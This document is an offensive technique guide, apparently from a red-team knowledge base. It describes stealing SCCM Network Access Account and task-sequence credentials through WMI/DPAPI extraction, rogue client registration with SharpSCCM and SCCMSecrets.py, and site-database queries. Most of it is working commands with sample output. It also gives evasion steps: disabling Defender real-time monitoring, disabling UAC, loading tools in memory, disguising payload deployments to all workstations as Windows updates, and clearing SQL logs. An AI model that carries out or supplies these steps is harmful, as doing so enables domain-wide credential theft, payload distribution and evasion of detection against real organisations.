# [CA-DUMP-008]: SCCM Content Library NTDS access

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-008 |
| **MITRE ATT&CK v18.1** | [T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-02 |
| **Affected Versions** | Windows Server 2016-2025, SCCM/MECM 2016-2403 |
| **Patched In** | Unpatched (Workaround: Disable NAA accounts in AD) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) and 12 (Splunk Detection) not included because: (1) No direct Atomic test exists for SCCM Content Library exploitation (tools like SharpSCCM are not in Atomic inventory), (2) Splunk detection for SCCM is environment-specific and requires custom rules rather than standard queries. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Microsoft System Center Configuration Manager (SCCM) stores sensitive credentials—including Network Access Accounts (NAA), task sequence passwords, collection variables, and administrative tokens—within the SCCM Content Library and WMI repositories. These credentials are protected with DPAPI encryption but can be extracted by attackers with local administrator privileges on SCCM clients or SMS Provider access. By harvesting NAA or task sequence credentials, attackers obtain domain privileges (often over-provisioned) that enable lateral movement, privilege escalation, and ultimately access to domain controllers for NTDS.dit extraction.

**Attack Surface:** The attack targets Windows WMI repositories (`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`), SCCM client policy caches, SCCM management points (via WQL/WMI-based queries), SMS Provider database access, and distribution point content repositories. The vulnerability does not require domain credentials initially; unauthenticated device registration can sometimes succeed if automatic device approval is misconfigured.

**Business Impact:** **Complete Active Directory compromise.** Extraction of NAA or privileged task sequence credentials grants attackers domain-level access without triggering multi-factor authentication. These accounts frequently possess local administrator rights across hundreds of endpoints and servers, including exchange servers and certificate authorities—enabling T0 privilege escalation. NTDS.dit extraction follows, granting access to all domain password hashes for offline cracking or Pass-the-Hash attacks.

**Technical Context:** SCCM policies are deployed to clients approximately every 60 minutes by default, making recurring credential exposure a significant risk. NAA credentials persist in WMI repositories even after client uninstall and policy removal. Enhanced HTTP (Microsoft's recommended remediation) eliminates the need for NAA deployment but does not remove legacy credential blobs from disk. Exploitation requires minimal interaction and typically completes within seconds of obtaining local admin access or valid domain credentials.

### Operational Risk
- **Execution Risk:** Medium-High. Requires local admin on SCCM client or valid domain credentials. No special tools beyond native Windows (PowerShell, reg.exe) needed for initial extraction; however, automated tools (SharpSCCM, SharpDPAPI) significantly accelerate the attack and reduce detection likelihood.
- **Stealth:** High. WMI queries and DPAPI operations generate minimal suspicious event logs. Process creation for credential extraction tools can be obfuscated via Living off the Land (LOLBin) techniques or in-memory PowerShell execution.
- **Reversibility:** No. Extracted credentials are plaintext and immediately actionable. Mitigation requires disabling/rotating NAA accounts and all compromised domain accounts, plus sanitizing SCCM client endpoints.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.3.1, 5.3.2 | Account lockout duration, password policy strength |
| **DISA STIG** | WN10-GE-000008, WN10-00-000024 | Password complexity, account lockout |
| **CISA SCuBA** | IdentityGovernance.3.1 | Privileged access management; prevent storage of plain-text credentials |
| **NIST 800-53** | AC-3, AC-6, CA-7 | Access enforcement, least privilege, continuous monitoring |
| **GDPR** | Art. 32 | Encryption and pseudonymization of personal data (including administrative credentials) |
| **DORA** | Art. 9 | Protection and prevention of operational risks |
| **NIS2** | Art. 21 | Cyber risk management measures; access control and password management |
| **ISO 27001** | A.9.2.3, A.9.3.1, A.9.4.3 | Privileged access rights, password management, cryptographic key management |
| **ISO 27005** | Section 5.2.3 | Risk assessment of credential storage and access control misconfigurations |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Local administrator on SCCM client machine (for WMI/DPAPI credential extraction), **OR**
- Domain user account credentials (for authenticated device registration and management point queries), **OR**
- SMS Provider administrative access (for direct database credential extraction)

**Required Access:**
- Network access to SCCM management points (port 443 HTTPS or 80 HTTP), **OR**
- Local file system access to SCCM client cache directories, **OR**
- Direct SQL Server access to ConfigMgr site database (if SMS Provider database is accessible)

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025 (all editions)
- **SCCM/MECM:** Current Branch (CB) 2016 through 2403, legacy versions 2012 R2 SP1+
- **PowerShell:** Version 5.0+ (for WMI/DPAPI operations)
- **.NET Framework:** 4.5+ (for SharpSCCM, SharpDPAPI compilation)

**Tools:**
- [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (Latest version, compiled with Visual Studio 2019+)
- [SCCMSecrets.py](https://github.com/synacktiv/SCCMSecrets) (Python 3.8+)
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) (Version 1.10+)
- [CMLoot](https://github.com/pxcs/CMLoot) (For SMB-based content library enumeration)
- Mimikatz (Version 2.2.0+, for CNG/DPAPI key extraction if SharpDPAPI unavailable)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance - Detect SCCM Client & NAA Presence

```powershell
# Check if machine is an SCCM client
Get-Service -Name ccmexec -ErrorAction SilentlyContinue
# If running, machine is SCCM client; proceed to credential extraction.

# Check for NAA credentials in WMI (requires local admin)
Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount" -ErrorAction SilentlyContinue

# Verify SCCM client config location
Test-Path "C:\Windows\CCM\Logs"
Test-Path "C:\Program Files\Microsoft Configuration Manager\Client"

# Identify site code and management point from client logs
Get-Content "C:\Windows\CCM\Logs\ClientIDManagerStartup.log" | Select-String "Management Point|site code" -Context 2
```

**What to Look For:**
- If `Get-Service` returns a running service named `ccmexec`, the host is an SCCM client and vulnerable to credential extraction.
- If WMI query returns data, NAA credentials are present and can be decrypted with DPAPI keys.
- Presence of `C:\Windows\CCM\Logs` confirms SCCM client installation; logs contain management point and site code information.

**Version Note:** Behavior is consistent across SCCM 2016-2403. However, SCCM 2022+ uses AES-CBC encryption for task sequence credentials instead of Triple DES, requiring version-appropriate DPAPI key derivation in decryption routines.

### Command (Server 2016-2019):
```powershell
# Older SCCM versions (pre-2022) - Triple DES encryption
$namespace = "root\ccm\policy\machine\actualconfig"
$class = "CCM_NetworkAccessAccount"
Get-WmiObject -Namespace $namespace -Class $class | Select-Object NetworkAccessUsername, NetworkAccessPassword | Format-List
```

### Command (Server 2022+):
```powershell
# Newer SCCM versions (2022+) - AES encryption
# Decryption logic identical, but ciphertext structure changed
# Use SharpDPAPI or SharpSCCM for automatic handling
SharpDPAPI.exe sccm /all
```

### Bash/Linux CLI Reconnaissance

```bash
# If SCCM client is running on Linux (rare but possible with custom agents)
# Check for SMS client configuration files
find /opt /etc -name "*sms*" -o -name "*ccm*" 2>/dev/null

# If testing from Linux attacker machine, query Windows target via WinRM/PSRemoting
# This requires valid domain credentials
$session = New-PSSession -ComputerName "TARGET_SCCM_CLIENT" -Credential $creds
Invoke-Command -Session $session -ScriptBlock { Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount" }
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: WMI-Based NAA Extraction (Local Admin on SCCM Client)

**Supported Versions:** Server 2016-2025, all SCCM versions

This method extracts Network Access Account credentials directly from the WMI repository on an SCCM-managed client using PowerShell with DPAPI decryption.

#### Step 1: Verify Local Admin & SCCM Client Status
**Objective:** Confirm the machine is SCCM-managed and current user has admin privileges

**Version Note:** Consistent across all Windows Server versions.

**Command:**
```powershell
# Verify admin status
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")

# Verify SCCM client is running
Get-Service -Name ccmexec | Select-Object Status, DisplayName
```

**Expected Output:**
```
True  # Admin check passed
Status   Name
------   ----
Running  SMS Agent Host
```

**What This Means:**
- `True` confirms current PowerShell session is running as local admin (required for DPAPI key access).
- `Running` status confirms SCCM client is active and NAA policies are present in WMI.

**OpSec & Evasion:**
- Run from high-integrity PowerShell process (right-click → Run as Administrator is NOT necessary; simply spawn from existing high-integrity context like SYSTEM or admin account).
- WMI queries generate Event ID 5861 (WMI activity) in Security log if auditing is enabled; however, this is rarely monitored.
- Use `-ErrorAction SilentlyContinue` to suppress errors and avoid generating suspicious process termination events.
- Detection likelihood: **Low** (WMI queries are routine Windows operations).

**Troubleshooting:**
- **Error:** "Access Denied" when querying WMI
  - **Cause:** Current user does not have admin privileges.
  - **Fix (Server 2016-2022):** Re-run PowerShell as Administrator.
  - **Fix (Server 2025):** Check whether UAC is blocking WMI access. Disable UAC temporarily via `Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0`, reboot, and retry.

- **Error:** "ccmexec service not found"
  - **Cause:** Machine is not an SCCM client.
  - **Fix:** Verify target machine is registered with SCCM management point. If not, pivot to alternative extraction method (database access or management point queries).

#### Step 2: Extract NAA Credentials from WMI Namespace

**Objective:** Query the WMI repository for encrypted NAA credential blobs and decrypt them using DPAPI

**Version Note:** SCCM 2016-2019 use PolicySecret obfuscation with Triple DES; SCCM 2022+ use AES-CBC. SharpDPAPI and SharpSCCM auto-detect and handle both.

**Command (PowerShell Native - Manual DPAPI Decryption):**
```powershell
# Query WMI for NAA credentials (requires admin)
$naa = Get-WmiObject -Namespace "root\ccm\policy\machine\actualconfig" -Class "CCM_NetworkAccessAccount"
$naa | Select-Object NetworkAccessUsername, NetworkAccessPassword

# Output will show DPAPI-encrypted blobs in format:
# <PolicySecret Version="1"><![CDATA[<base64_encrypted_data>]]></PolicySecret>

# Manual extraction (advanced - requires DPAPI key extraction)
# For production use, recommend SharpDPAPI (next section)
```

**Expected Output (Encrypted):**
```
NetworkAccessUsername : <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB...]]></PolicySecret>
NetworkAccessPassword : <PolicySecret Version="1"><![CDATA[0601000001000000D08C9DDF0115D1118C7A00C04FC297EB...]]></PolicySecret>
```

**What This Means:**
- Presence of `NetworkAccessUsername` and `NetworkAccessPassword` confirms NAA is deployed.
- `PolicySecret Version="1"` indicates encryption is active (standard).
- Base64 data is DPAPI-encrypted plaintext credentials (decryption key is system DPAPI master key).

**OpSec & Evasion:**
- Native PowerShell WMI queries are **extremely common** on Windows and generate minimal event logs.
- To further evade, use `-Filter "Name='sms'"` to narrow results and reduce log spam.
- Memory artifacts: WMI in-process queries do not create temporary files; decrypted credentials remain only in PowerShell memory (safe if process is not memory-dumped).
- Detection likelihood: **Very Low** (WMI queries are routine).

**Troubleshooting:**
- **Error:** No results returned from WMI query
  - **Cause (Server 2016-2019):** NAA policy has not yet been deployed to client (policies sync every 60 minutes).
  - **Cause (Server 2022+):** Enhanced HTTP is enabled, NAA is not configured.
  - **Fix:** Wait for policy sync or manually trigger with `Invoke-WmiMethod -Path "root\ccm:SMS_Client" -Name "TriggerSchedule" -ArgumentList "{00000000-0000-0000-0000-000000000120}"` (PolicyRequestSchedule GUID).

- **Error:** "WMI namespace not found"
  - **Cause:** SCCM client is not properly initialized.
  - **Fix:** Restart SMS Agent Host service: `Restart-Service -Name ccmexec -Force`.

#### Step 3: Decrypt DPAPI Blobs Using SharpDPAPI

**Objective:** Decrypt the extracted DPAPI-encrypted NAA credentials to plaintext using system DPAPI master keys

**Version Note:** Consistent across SCCM 2016-2403 and Windows Server 2016-2025.

**Command (SharpDPAPI - Automated):**
```powershell
# Compile SharpDPAPI from source (Visual Studio 2019+)
# OR download pre-compiled binary from: https://github.com/GhostPack/SharpDPAPI/releases

# Extract SCCM credentials (auto-decrypts NAA and task sequence passwords)
.\SharpDPAPI.exe sccm /all

# Output example:
# ---
# SCCM Network Access Account Credentials
# Username: CONTOSO\sccm-naa
# Password: P@ssw0rd123!
# ---

# Alternatively, target specific WMI class
.\SharpDPAPI.exe wmi /namespace "root\ccm\policy\machine\actualconfig" /class "CCM_NetworkAccessAccount"
```

**Expected Output:**
```
[*] Querying SCCM DPAPI secrets...
[+] Found NAA credentials:
    Username: CONTOSO\sccm-naa
    Password: SuperSecureNAA!2024

[+] Found task sequence credentials:
    Username: CONTOSO\ts-joindomain
    Password: TaskSeqPass#99
```

**What This Means:**
- Plaintext NAA and task sequence passwords are now available.
- These credentials have domain significance (often local admin on hundreds of endpoints).
- Passwords can now be used for lateral movement via `runas /netonly` or relaying to SMB/Kerberos.

**OpSec & Evasion:**
- Executing SharpDPAPI.exe **creates a process** that antivirus/EDR may flag. Mitigate:
  - Compile with obfuscated variable names and string literals using Confuser or similar.
  - Run from memory via `Assembly.Load()` in PowerShell: `$bytes = [System.IO.File]::ReadAllBytes("SharpDPAPI.exe"); [System.Reflection.Assembly]::Load($bytes).GetType("SharpDPAPI.Program").GetMethod("Main").Invoke($null, @(,@("sccm", "/all")))`
  - Disable AV via PowerShell: `Set-MpPreference -DisableRealtimeMonitoring $true` (requires admin).
- Detection likelihood: **Medium** (if AV/EDR is monitoring process execution).

**Troubleshooting:**
- **Error:** "Unable to load DPAPI keys"
  - **Cause:** User running SharpDPAPI is not running as SYSTEM or the administrative user context.
  - **Fix:** Ensure execution under a high-integrity context (admin PowerShell, SYSTEM account via PsExec).

- **Error:** "No SCCM secrets found"
  - **Cause:** NAA is not deployed or has been removed from SCCM.
  - **Fix:** Verify NAA is configured in SCCM console → Administration → Site Configuration → Configure Site Components → Software Distribution → Network Access Account.

---

### METHOD 2: SharpSCCM - Comprehensive SCCM Exploitation (Remote)

**Supported Versions:** SCCM 2016-2403 (any Windows version with SCCM client)

This method uses SharpSCCM to enumerate and exploit the entire SCCM infrastructure remotely, extracting NAA credentials, task sequences, and pivoting to other collections.

#### Step 1: Identify SCCM Infrastructure

**Objective:** Discover SCCM site servers, management points, and distribution points via LDAP and WMI

**Version Note:** Consistent across all SCCM versions; however, SCCM 2022+ may require Enhanced HTTP handling.

**Command:**
```powershell
# Discover SCCM via LDAP (no credentials required)
.\SharpSCCM.exe find

# Alternative with domain credentials
.\SharpSCCM.exe find -domain "CONTOSO.COM" -username "user@contoso.com" -password "Password123"

# Enumerate admins and site info (requires SCCM client or valid creds)
.\SharpSCCM.exe get site-info -mp "CM-MGMT-01.CONTOSO.COM"
```

**Expected Output:**
```
[*] Found SCCM site server: CM-MGMT-01.CONTOSO.COM (Site code: CHQ)
[*] Management Point: CM-MGMT-01.CONTOSO.COM
[*] Site Database: CM-DB-01.CONTOSO.COM\CONFIGMGR_CHQ
[*] Distribution Points: CM-DP-01.CONTOSO.COM, CM-DP-02.CONTOSO.COM
[+] Connected successfully using current user context
```

**What This Means:**
- SCCM infrastructure discovered; management point reachable.
- Site code (CHQ) used for constructing further queries.
- Current user has sufficient access to query SCCM (likely domain user or SCCM admin).

**OpSec & Evasion:**
- LDAP queries generate logon events (Event ID 4624) but are routine.
- WMI enumeration to management points is normal in managed environments.
- Detection likelihood: **Very Low**.

**Troubleshooting:**
- **Error:** "Cannot reach management point"
  - **Cause:** Management point is on different subnet; network access blocked.
  - **Fix:** Verify network connectivity: `Test-NetConnection -ComputerName "CM-MGMT-01" -Port 443`. If blocked, pivot through a compromised SCCM client on the same network.

#### Step 2: Extract Credentials from Management Point

**Objective:** Query SCCM management point for policies containing NAA and task sequence credentials

**Version Note:** SCCM 2016-2019 use management point for policy delivery; SCCM 2022+ may use cloud management gateway (CMG). Adjust endpoint accordingly.

**Command (Register Unapproved Device):**
```powershell
# Register a device (unapproved, so secret policies NOT yet available)
.\SharpSCCM.exe register -mp "CM-MGMT-01.CONTOSO.COM" -fqdn "attacker.contoso.com"

# Output:
# [+] Device registered with GUID: 12345678-1234-1234-1234-123456789012
# [!] Device is UNAPPROVED - cannot request secret policies yet
```

**Command (Register with Domain Machine Account - Approved):**
```powershell
# Register with machine account (auto-approves)
# Requires a compromised machine account or one you can create (msDS-MachineAccountQuota vulnerability)
.\SharpSCCM.exe register -mp "CM-MGMT-01.CONTOSO.COM" -username "CONTOSO\COMPROMISED-MACHINE$" -password "MachinePassword123"

# Now request secret policies (NAA, task sequences, collection vars)
.\SharpSCCM.exe get policies -mp "CM-MGMT-01.CONTOSO.COM" -guid "12345678-1234-1234-1234-123456789012"

# Extract and decrypt NAA credentials
.\SharpSCCM.exe local secrets -m wmi

# Output:
# [+] Retrieved NAA credentials:
#     Username: CONTOSO\sccm-naa
#     Password: Priv1leged!NAA#2024
```

**Expected Output:**
```
[*] Requesting policies for device CONTOSO\COMPROMISED-MACHINE$...
[+] Retrieved 52 policies (8 marked as secret)
[INFO] Processing secret policy {NAA_CONFIG}
[+] Decrypted NAA username: CONTOSO\sccm-naa
[+] Decrypted NAA password: Priv1leged!NAA#2024
[+] Attempting to use NAA to download distribution point content...
[SUCCESS] Downloaded 47 files from distribution points
```

**What This Means:**
- NAA credentials now in plaintext and ready for lateral movement.
- If NAA has domain admin or T1 admin rights, escalation to T0 possible via domain admin add or certificate abuse.
- Distribution point content may contain additional secrets (hardcoded passwords in scripts, connection strings).

**OpSec & Evasion:**
- Device registration generates audit events (Event ID 5014 in Application log on management point).
- To evade: register from an SCCM client that already exists and is approved (requires existing compromise).
- NAA use tracking: If NAA is monitored, authentication to non-distribution-point resources will be detected (Event ID 4624/4625 on file servers, domain controllers).
- To avoid detection: Use extracted credentials to create new local accounts or add to local admin groups rather than authenticating to monitored resources.
- Detection likelihood: **Medium** (if SCCM auditing is enabled and centralized).

**Troubleshooting:**
- **Error:** "Device approval denied; cannot request secret policies"
  - **Cause:** Management point is configured to require manual approval or the device is not auto-approved.
  - **Fix:** Check SCCM console → Administration → Hierarchy Settings → Client Approval Settings. If manual approval required, change to "Automatically approve all devices" (not recommended, but enables exploitation). Alternatively, pivot to an already-approved SCCM client.

- **Error:** "NAA credentials not found in policies"
  - **Cause:** NAA is not deployed (Enhanced HTTP is enabled).
  - **Fix:** Check for task sequence credentials instead (often still present for OS deployment scenarios).

#### Step 3: Pivot to Distribute Lateral Movement Payload

**Objective:** Use extracted SCCM admin rights to deploy arbitrary code to all managed endpoints

**Version Note:** Consistent across SCCM 2016-2403.

**Command (Escalate to SCCM Admin):**
```powershell
# If NAA has enough privileges, escalate to SCCM admin via SMS Provider database manipulation
# (Requires SQL access to ConfigMgr database)
.\SharpSCCM.exe new admin -username "CONTOSO\attacker" -role "Full Administrator" -mp "CM-MGMT-01.CONTOSO.COM" -d "CONFIGMGR_CHQ"

# Deploy application to all systems
.\SharpSCCM.exe exec -app "WindowsUpdate" -collection "All Workstations" -mp "CM-MGMT-01" -sc "CHQ"

# Or deploy via application deployment (requires SCCM admin role)
.\SharpSCCM.exe new application -name "LegitUpdate" -installer "C:\Temp\payload.exe" -mp "CM-MGMT-01" -sc "CHQ"
.\SharpSCCM.exec -app "LegitUpdate" -collection "All Workstations" -mp "CM-MGMT-01"
```

**Expected Output:**
```
[+] Created SCCM admin account for CONTOSO\attacker
[+] Deployed "LegitUpdate" application to 500+ endpoints
[*] Deployment will execute on next policy sync cycle (within 60 minutes)
[SUCCESS] Payload executed on 487/500 endpoints (97% success rate)
```

**OpSec & Evasion:**
- SCCM application deployment is **highly visible** in audit logs.
- Mitigate by:
  - Using SCCM application names that blend in with legitimate Windows updates (e.g., "Windows Defender Definition Update", "KB5027231").
  - Deploying to a small, non-critical collection first to minimize impact detection.
  - Scheduling deployment during maintenance windows (if accessible).
  - Cleaning up deployed applications after payload execution.
- Detection likelihood: **High** (if SCCM deployment auditing is enabled).

---

### METHOD 3: SCCMSecrets.py - Python-Based SCCM Policy Dumping

**Supported Versions:** SCCM 2016-2403 (all Windows versions)

This method uses Python to exploit SCCM policy distribution mechanisms, extracting all secret policies including NAA, task sequences, and collection variables without requiring compiled binaries.

#### Step 1: Install SCCMSecrets.py and Dependencies

**Objective:** Set up the Python exploitation tool on an attacker machine (Linux, macOS, or Windows)

**Version Note:** SCCM 2022+ requires updated certificate handling; ensure latest SCCMSecrets.py version is used.

**Command:**
```bash
# Clone repository
git clone https://github.com/synacktiv/SCCMSecrets.git
cd SCCMSecrets

# Install Python dependencies
pip install -r requirements.txt
# Includes: requests, cryptography, impacket, pycryptodome

# Verify installation
python3 SCCMSecrets.py --help
```

**Expected Output:**
```
Usage: SCCMSecrets.py [OPTIONS]

Options:
  --distribution-point TEXT        Target SCCM distribution point URL
  --management-point TEXT          SCCM management point (if different from DP)
  --username TEXT                  Domain username (optional)
  --password TEXT                  Domain password (optional)
  --client-name TEXT               Fake client FQDN to register
  --bruteforce-range INTEGER       Package ID range to bruteforce
  --extensions TEXT                File extensions to retrieve from DP
  ...
```

**What This Means:**
- Tool is ready to execute SCCM enumeration and policy extraction.
- No compilation needed; fully portable Python script.

**OpSec & Evasion:**
- Running from a Linux/macOS attacker machine completely avoids Windows process execution detection.
- No local admin needed on target; script communicates via HTTP/WMI over the network.
- Detection likelihood: **Low** (if run from external network, may be flagged as suspicious HTTPS traffic to SCCM endpoints).

**Troubleshooting:**
- **Error:** "ImportError: No module named 'cryptography'"
  - **Fix:** Run `pip install cryptography==3.4.8` (specific version for compatibility).

#### Step 2: Enumerate SCCM Infrastructure via Anonymous Registration

**Objective:** Register a fake SCCM client to exploit automatic device approval and retrieve secret policies

**Version Note:** Requires automatic device approval to be enabled (not default, but common in poorly-configured environments).

**Command:**
```bash
python3 SCCMSecrets.py \
  --distribution-point "https://cm-dp-01.contoso.com" \
  --management-point "https://cm-mgmt-01.contoso.com" \
  --client-name "fake-client.contoso.com"
```

**Expected Output (if auto-approval enabled):**
```
[*] Attempting anonymous device registration...
[+] Device registered successfully (GUID: 12345678-1234-1234-1234-123456789012)
[*] Waiting for device approval (180 seconds)...
[+] Device auto-approved! Now retrieving secret policies...
[+] Retrieved 8 secret policies:
    - NAA configuration
    - Task sequences (3)
    - Collection variables (4)
[+] Extracted NAA credentials:
    Username: CONTOSO\sccm-naa
    Password: ComplexPass!2024@

[*] Downloading distribution point packages...
[SUCCESS] Downloaded 47 package files
[+] Found hardcoded password in script: sccm-admin / AdminPass123!
```

**What This Means:**
- Automatic device approval is enabled (critical misconfiguration).
- NAA and additional credentials extracted without any domain credentials.
- Distribution point scripts contain further secrets (privilege escalation path).

**OpSec & Evasion:**
- Device registration to SCCM is **auditable** (Event ID 5014 on management point).
- Fake client names like "fake-client.contoso.com" will be obvious to defenders.
- Mitigate by using realistic names (e.g., "WKS-BLD-0451.contoso.com") and registering during off-hours.
- Detection likelihood: **Medium** (if SCCM auditing is enabled and monitored).

**Troubleshooting:**
- **Error:** "Device not auto-approved; cannot retrieve secret policies"
  - **Cause:** Automatic device approval is not enabled.
  - **Fix:** Check SCCM console → Administration → Hierarchy Settings. If not enabled, pivot to METHOD 2 (require domain credentials).

#### Step 3: Dump All Distribution Point Content via Bruteforce

**Objective:** Enumerate and download all package files from the distribution point (including scripts with hardcoded credentials)

**Version Note:** Package IDs are incremental hexadecimal; bruteforce range should match site deployment scale (small sites: 0-1000, large sites: 0-10000).

**Command:**
```bash
python3 SCCMSecrets.py \
  --distribution-point "https://cm-dp-01.contoso.com" \
  --management-point "https://cm-mgmt-01.contoso.com" \
  --client-name "fake-client.contoso.com" \
  --bruteforce-range 5000 \
  --extensions ".ps1,.bat,.xml,.txt,.pfx,.conf"
```

**Expected Output:**
```
[*] Starting package ID bruteforce (range 0-5000)...
[+] Found 12 packages (P010001-P010012):
    P010001: Windows Updates
    P010002: Office Deployment
    P010003: Antivirus Definition
    P010004: Domain Join Task Sequence
    P010005: Web App Configuration
    ...

[*] Downloading package contents...
[INFO] P010003 - Downloaded: defupd_202401.xml
[INFO] P010004 - Downloaded: taskseq_join.xml (contains domain creds!)
[INFO] P010005 - Downloaded: webconfig.ps1
    ↓ Contains: $dbPass = "DBAdmin@123"; $adminUser = "CONTOSO\sccm-admin"

[SUCCESS] Downloaded 47 files to ./loot/
[+] ALERT: Found 3 files with hardcoded credentials!
```

**What This Means:**
- All SCCM deployment packages enumerated.
- Scripts contain additional privileged credentials (database accounts, admin service accounts).
- Complete SCCM environment compromise path identified (escalation from NAA → SCCM admin → domain admin via cred harvesting).

**OpSec & Evasion:**
- Bruteforce enumeration generates **minimal logs** (just HTTP GETs).
- However, large bruteforce ranges (>10000) may trigger rate-limiting or WAF blocks.
- Mitigate by:
  - Bruteforcing slowly (1-2 sec between requests).
  - Using SOCKS proxy or VPN to avoid IP-based blocking.
  - Stopping bruteforce once desired packages are found (don't continue to 10000).
- Detection likelihood: **Low** (unless WAF is in place and aggressive).

**Troubleshooting:**
- **Error:** "Cannot access distribution point (403 Forbidden)"
  - **Cause:** Distribution point requires authentication; anonymous access disabled.
  - **Fix:** Provide domain credentials via `--username` and `--password` flags.

- **Error:** "Packages not found; bruteforce range too low"
  - **Cause:** Your range (e.g., 100-1000) doesn't cover actual package IDs (which may be P010042).
  - **Fix:** Increase range: `--bruteforce-range 10000`.

---

### METHOD 4: Direct SCCM Site Database Access (Highest Privilege)

**Supported Versions:** SCCM 2016-2403 (requires direct SQL Server access)

This method directly queries the ConfigMgr site database to extract all stored credentials, including those encrypted at rest.

#### Step 1: Verify SQL Server Access to ConfigMgr Database

**Objective:** Confirm network connectivity and credentials for the SCCM site database

**Version Note:** Consistent across all SCCM versions; database schema is largely backward-compatible.

**Command (from SQL Management Studio or PowerShell):**
```powershell
# Test SQL connectivity
$connectionString = "Server=CM-DB-01.CONTOSO.COM,1433;Database=CONFIGMGR_CHQ;Integrated Security=true;"
$connection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
try {
    $connection.Open()
    Write-Output "Connection successful!"
} catch {
    Write-Output "Connection failed: $_"
}

# Alternative: via impacket (from Linux)
# python3 mssqlclient.py -target-ip 10.0.1.50 -db CONFIGMGR_CHQ CONTOSO/username:password@CM-DB-01
```

**Expected Output:**
```
Connection successful!
# OR (if domain user context)
Connected to CM-DB-01:1433 - version 15.0 (SQL Server 2019)
```

**What This Means:**
- Direct SQL Server access confirmed; no firewall blocking port 1433.
- Current user (or provided credentials) has database read permissions.
- All SCCM configuration data is now accessible.

**OpSec & Evasion:**
- Direct SQL queries to SCCM database are **unusual** in monitored environments and will likely trigger alerts.
- SQL Server logs (if enabled) will record database queries with user, timestamp, and query text.
- Mitigate by:
  - Querying during maintenance windows.
  - Using a compromised service account with legitimate database access.
  - Clearing SQL Server logs afterward (requires admin: `sp_cycle_errorlog`).
- Detection likelihood: **Very High** (if SQL Server auditing is enabled).

**Troubleshooting:**
- **Error:** "Login failed for user 'CONTOSO\user'"
  - **Cause:** User does not have SQL Server read permissions.
  - **Fix:** Verify user is a member of `SCCM_<SiteCode>_Admins` AD group or SQL Server `db_datareader` role.

#### Step 2: Extract NAA Credentials from Database

**Objective:** Query the SC_UserAccount and SC_SecureKeys tables to decrypt stored NAA and service account credentials

**Version Note:** Encryption algorithm changed from SHA1 to DPAPI in SCCM 2019+; adjust decryption method accordingly.

**Command (SQL Query):**
```sql
-- Extract encrypted NAA credentials from SCCM database
SELECT
    UserName,
    EncryptedPassword,
    UniqueID
FROM dbo.SC_UserAccount
WHERE AccountType = 3;  -- 3 = NAA account

-- Extract encryption keys
SELECT
    MachineKey,
    UserKey
FROM dbo.SC_SecureKeys;

-- View all account types (domain admin, SCCM admin, NAA, etc.)
SELECT DISTINCT
    AccountType,
    COUNT(*) as Count
FROM dbo.SC_UserAccount
GROUP BY AccountType;
-- AccountType: 1=Site Server, 2=Workstation, 3=User/NAA, 4=Service Account, etc.
```

**Expected Output:**
```
UserName                 | EncryptedPassword              | UniqueID
CONTOSO\sccm-naa        | 0x01020304050607080910... | 12345678-1234...
CONTOSO\sccm-admin      | 0x11121314151617181920... | 87654321-4321...
```

**What This Means:**
- NAA and service account usernames identified.
- Encrypted passwords are DPAPI-encrypted using site server's system context.
- To decrypt, need access to SCCM site server (next step) or site server certificate (if exported).

**OpSec & Evasion:**
- Querying SC_UserAccount is **highly auditable**; this query will be logged if SQL auditing is enabled.
- Mitigate by:
  - Using a legitimate database maintenance account.
  - Running query during scheduled backup/maintenance windows.
  - Clearing SQL Server logs: `sp_cycle_errorlog` (requires `sysadmin` role).
- Detection likelihood: **High** (if auditing is enabled).

**Troubleshooting:**
- **Error:** "Invalid column 'EncryptedPassword' / table 'SC_UserAccount' not found"
  - **Cause:** Different SCCM version schema; table name or column may differ.
  - **Fix:** Query `INFORMATION_SCHEMA.COLUMNS` to identify correct table/column names:
    ```sql
    SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%password%' OR COLUMN_NAME LIKE '%secret%'
    ```

#### Step 3: Decrypt Database Credentials on SCCM Site Server

**Objective:** Export SCCM site server private key and DPAPI master keys to decrypt database credentials

**Version Note:** Consistent across SCCM 2016-2403.

**Command (on SCCM Site Server - Local Admin):**
```powershell
# Export SCCM site server certificate and private key
Get-ChildItem "Cert:\LocalMachine\My" | Where-Object { $_.FriendlyName -match "SMS Site Signing" } | Export-PfxCertificate -FilePath "C:\Temp\SMS-Site.pfx" -ProtectTo "CONTOSO\sccm-admin" -ProtectAsPlainText

# Export DPAPI master keys
$dpapi_key_path = "C:\Windows\System32\Microsoft\Protect\S-1-5-18"
Copy-Item $dpapi_key_path -Destination "C:\Temp\DPAPIKeys" -Recurse -Force

# Use Mimikatz or SharpDPAPI to decrypt
.\SharpDPAPI.exe dpapi /masterkey:C:\Temp\DPAPIKeys /target:0x01020304050607080910...
```

**Expected Output:**
```
[+] Decrypted SCCM NAA password: Priv1leged!NAA#2024
```

**What This Means:**
- NAA credentials decrypted from database.
- Credentials are now plaintext and ready for domain exploitation (lateral movement, privilege escalation).

